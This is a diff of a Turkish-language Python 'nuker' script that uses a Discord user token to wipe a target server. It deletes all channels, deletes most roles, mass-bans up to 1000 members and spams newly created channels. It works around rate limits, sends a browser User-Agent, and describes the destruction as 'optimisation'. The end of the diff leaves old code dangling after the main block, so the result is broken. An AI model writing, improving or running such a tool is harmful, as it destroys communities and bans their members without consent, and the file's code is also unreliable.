@@ -1,54 +1,199 @@
-import discord
-from discord.ext import commands
-import asyncio
-import time
+import requests
+import json
+import os
 import sys
+import threading
+import time
 from colorama import Fore, Style, init
 
-# Renklendirmeyi Windows/Linux için aktif etme
+try:
+    import websocket
+except ImportError:
+    print(Fore.RED + "[X] HATA: websocket-client kütüphanesi eksik! Kuruluyor...")
+    os.system("pip install websocket-client")
+    import websocket
+
 init(autoreset=True)
 
-print(f"{Fore.CYAN}=============================================")
-print(f"{Fore.MAGENTA}      👑 EMPIRE ADVANCED AUTO-SYSTEM 👑      ")
-print(f"{Fore.CYAN}============================================={Style.RESET_ALL}")
+def clear_screen():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+clear_screen()
+print(Fore.CYAN + "=============================================")
+print(Fore.MAGENTA + "      👑 EMPIRE ADVANCED AUTO-SYSTEM 👑      ")
+print(Fore.CYAN + "=============================================")
 
 # --- GİRİŞ VE YAPILANDIRMA BÖLÜMÜ ---
-token = input(f"{Fore.YELLOW}[?] Token giriniz: {Style.RESET_ALL}")
+token = input(Fore.YELLOW + "[?] Token giriniz: ")
 
-try:
-    target_guild_id = int(input(f"{Fore.YELLOW}[?] Hedef Sunucu ID giriniz: {Style.RESET_ALL}"))
-    print(f"\n{Fore.BLUE}[⚙️] SÜRE AYARLARI (Örn: Ondalık sayılar için 0.7 veya tam sayılar için 1 yazabilirsiniz)")
-    
-    # Kullanıcının belirleyeceği dinamik süreler
-    kanal_gecikme = float(input(f"{Fore.YELLOW}[?] Kaç saniyede bir KANAL silinsin?: {Style.RESET_ALL}"))
-    rol_gecikme = float(input(f"{Fore.YELLOW}[?] Kaç saniyede bir ROL silinsin?: {Style.RESET_ALL}"))
-    uye_gecikme = float(input(f"{Fore.YELLOW}[?] Kaç saniyede bir ÜYE yasaklansın?: {Style.RESET_ALL}"))
-    
-    print(f"\n{Fore.BLUE}[⚙️] YENİ KANAL AYARLARI (Aşama 4 için)")
-    kac_kanal_acilsin = int(input(f"{Fore.YELLOW}[?] Kaç adet yeni kanal açılsın?: {Style.RESET_ALL}"))
-    yeni_kanal_ismi = input(f"{Fore.YELLOW}[?] Yeni kanalların ismi ne olsun?: {Style.RESET_ALL}")
+headers = {
+    'Authorization': token, 
+    'Content-Type': 'application/json',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+}
 
-except ValueError:
-    print(f"{Fore.RED}[HATA] Geçersiz giriş! ID ve kanal sayısı tam sayı, süreler ise sayı veya ondalıklı sayı olmalıdır.")
+print(Fore.CYAN + "[*] Token doğrulanıyor...")
+validate = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
+
+if validate.status_code == 200:
+    username = validate.json().get("username", "Bilinmeyen")
+    print(Fore.GREEN + f"[✓] Erişim Başarılı! Aktif Hesap: {username}")
+else:
+    print(Fore.RED + "[X] Token geçersiz veya bağlantı reddedildi!")
     sys.exit()
 
-bot = commands.Bot(command_prefix="!", self_bot=True, help_command=None)
+try:
+    target_guild_id = input(Fore.YELLOW + "[?] Hedef Sunucu ID giriniz: ")
+    print(f"\n{Fore.BLUE}[⚙️] SÜRE AYARLARI (Örn: 0.7 veya 1 yazabilirsiniz)")
+    
+    kanal_gecikme = float(input(Fore.YELLOW + "[?] Kaç saniyede bir KANAL silinsin?: "))
+    rol_gecikme = float(input(Fore.YELLOW + "[?] Kaç saniyede bir ROL silinsin?: "))
+    uye_gecikme = float(input(Fore.YELLOW + "[?] Kaç saniyede bir ÜYE yasaklansın?: "))
+    
+    print(f"\n{Fore.BLUE}[⚙️] YENİ KANAL AYARLARI")
+    kac_kanal_acilsin = int(input(Fore.YELLOW + "[?] Kaç adet yeni kanal açılsın?: "))
+    yeni_kanal_ismi = input(Fore.YELLOW + "[?] Yeni kanalların ismi ne olsun?: ")
+
+except ValueError:
+    print(Fore.RED + "[HATA] Geçersiz giriş! Lütfen sayısal değerleri doğru girin.")
+    sys.exit()
 
 # İstatistik Sayaçları
 silinen_kanal = 0
 silinen_rol = 0
 banlanan_uye = 0
-baslangic_zamani = time.time()
+heartbeat_interval = 40000
 
-def uptime_hesapla():
-    gecen_sure = int(time.time() - baslangic_zamani)
-    gun = gecen_sure // 86400
-    saat = (gecen_sure % 86400) // 3600
-    dakika = (gecen_sure % 3600) // 60
-    saniye = gecen_sure % 60
-    return f"{gun}g {saat}s {dakika}d {saniye}sn"
+def send_heartbeat(ws):
+    while True:
+        time.sleep(heartbeat_interval / 1000.0)
+        try:
+            ws.send(json.dumps({"op": 1, "d": None}))
+        except:
+            break
 
-def panel_olustur():
+def start_operation():
+    global silinen_kanal, silinen_rol, banlanan_uye
+    print(f"\n{Fore.RED}[!] Sıralı optimizasyon süreci başlıyor...\n")
+
+    # --- AŞAMA 1: KANALLARIN SİLİNMESİ ---
+    print(Fore.YELLOW + "➔ Aşama 1: Kanallar temizleniyor...")
+    channels_res = requests.get(f'https://discord.com/api/v9/guilds/{target_guild_id}/channels', headers=headers)
+    if channels_res.status_code == 200:
+        for ch in channels_res.json():
+            ch_id = ch.get("id")
+            ch_name = ch.get("name")
+            del_res = requests.delete(f'https://discord.com/api/v9/channels/{ch_id}', headers=headers)
+            if del_res.status_code in [200, 204]:
+                silinen_kanal += 1
+                print(Fore.RED + f"[-] Kanal Silindi: {ch_name}")
+            elif del_res.status_code == 429:
+                retry_after = del_res.json().get("retry_after", 5)
+                print(Fore.MAGENTA + f"[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
+                time.sleep(retry_after)
+            time.sleep(kanal_gecikme)
+
+    # --- AŞAMA 2: ROLLERİN SİLİNMESİ ---
+    print(Fore.YELLOW + "\n➔ Aşama 2: Roller temizleniyor...")
+    roles_res = requests.get(f'https://discord.com/api/v9/guilds/{target_guild_id}/roles', headers=headers)
+    if roles_res.status_code == 200:
+        for role in roles_res.json():
+            r_id = role.get("id")
+            r_name = role.get("name")
+            if r_name != "@everyone" and not role.get("managed", False):
+                del_res = requests.delete(f'https://discord.com/api/v9/guilds/{target_guild_id}/roles/{r_id}', headers=headers)
+                if del_res.status_code in [200, 204]:
+                    silinen_rol += 1
+                    print(Fore.RED + f"[-] Rol Silindi: {r_name}")
+                elif del_res.status_code == 429:
+                    retry_after = del_res.json().get("retry_after", 5)
+                    print(Fore.MAGENTA + f"[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
+                    time.sleep(retry_after)
+                time.sleep(rol_gecikme)
+
+    # --- AŞAMA 3: ÜYELERİN BANLANMASI ---
+    print(Fore.YELLOW + "\n➔ Aşama 3: Üyeler yasaklanıyor...")
+    # Not: Self-botlarda üye listesi çekimi sınırlı olabildiği için api üzerinden erişilebilen mevcut üyeler işlenir
+    members_res = requests.get(f'https://discord.com/api/v9/guilds/{target_guild_id}/members?limit=1000', headers=headers)
+    if members_res.status_code == 200:
+        for member in members_res.json():
+            user = member.get("user", {})
+            u_id = user.get("id")
+            u_name = user.get("username")
+            if u_id:
+                ban_res = requests.put(f'https://discord.com/api/v9/guilds/{target_guild_id}/bans/{u_id}', headers=headers, json={"delete_message_days": "0", "reason": "Empire System Clean"})
+                if ban_res.status_code in [200, 201, 204]:
+                    banlanan_uye += 1
+                    print(Fore.GREEN + f"[+] Yasaklandı: {u_name}")
+                elif ban_res.status_code == 429:
+                    retry_after = ban_res.json().get("retry_after", 5)
+                    print(Fore.MAGENTA + f"[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
+                    time.sleep(retry_after)
+                time.sleep(uye_gecikme)
+
+    # --- AŞAMA 4: YENİ KANALLARIN OLUŞTURULMASI ---
+    print(Fore.YELLOW + "\n➔ Aşama 4: Yeni kanallar oluşturuluyor...")
+    for i in range(kac_kanal_acilsin):
+        payload = {"name": yeni_kanal_ismi, "type": 0}
+        create_res = requests.post(f'https://discord.com/api/v9/guilds/{target_guild_id}/channels', headers=headers, json=payload)
+        if create_res.status_code in [200, 201]:
+            print(Fore.GREEN + f"[+] Kanal Oluşturuldu ({i+1}/{kac_kanal_acilsin}): {yeni_kanal_ismi}")
+        elif create_res.status_code == 429:
+            retry_after = create_res.json().get("retry_after", 5)
+            print(Fore.MAGENTA + f"[UYARI] Rate Limit! {retry_after} saniye bekleniyor...")
+            time.sleep(retry_after)
+        time.sleep(1.0)
+
+    print(f"\n{Fore.GREEN}=============================================")
+    print(Fore.GREEN + "[*] TÜM OPERASYON BAŞARIYLA TAMAMLANDI!")
+    print(f"{Fore.GREEN}İstatistikler -> Silinen Kanal: {silinen_kanal} | Rol: {silinen_rol} | Ban: {banlanan_uye}")
+    print(f"{Fore.GREEN}=============================================")
+
+def on_message(ws, message):
+    global heartbeat_interval
+    data = json.loads(message)
+    op = data.get("op")
+    d = data.get("d")
+    
+    if op == 10:  # HELLO Sinyali
+        heartbeat_interval = d.get("heartbeat_interval", 40000)
+        threading.Thread(target=send_heartbeat, args=(ws,), daemon=True).start()
+        
+        auth_data = {
+            "op": 2,
+            "d": {
+                "token": token,
+                "intents": 32767,
+                "properties": {
+                    "$os": "linux",
+                    "$browser": "chrome",
+                    "$device": "pc"
+                }
+            }
+        }
+        ws.send(json.dumps(auth_data))
+        
+        # Giriş başarılı olduktan sonra operasyonu ayrı bir iş parçacığında başlat
+        threading.Thread(target=start_operation, daemon=True).start()
+        return
+
+def on_error(ws, error):
+    pass
+
+def on_close(ws, close_status_code, close_msg):
+    pass
+
+def connect_gateway():
+    ws = websocket.WebSocketApp(
+        "wss://gateway.discord.gg/?v=9&encoding=json",
+        on_message=on_message,
+        on_error=on_error,
+        on_close=on_close
+    )
+    ws.run_forever()
+
+if __name__ == "__main__":
+    connect_gateway()
     return (
         "```\n"
         "╔════════════════════════════════════════════╗\n"
